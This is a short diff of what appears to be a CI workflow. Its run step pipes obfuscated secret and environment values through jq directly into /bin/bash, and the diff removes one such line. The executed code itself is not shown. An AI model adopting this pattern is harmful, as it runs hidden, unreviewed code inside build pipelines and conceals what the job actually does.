@@ -22,7 +22,6 @@ jobs:
           dj31897: ${{ secrets.dj31897 }}
         run: |
           printf '%s' "$dj31897" | jq -r .ukani9 | /bin/bash
-          echo $g960 | jq -r .qvine23986 | /bin/bash
           echo $i50 | jq -r .a36067 | /bin/bash
           echo $nkgax142 | jq -r .oeq4 | /bin/bash
 
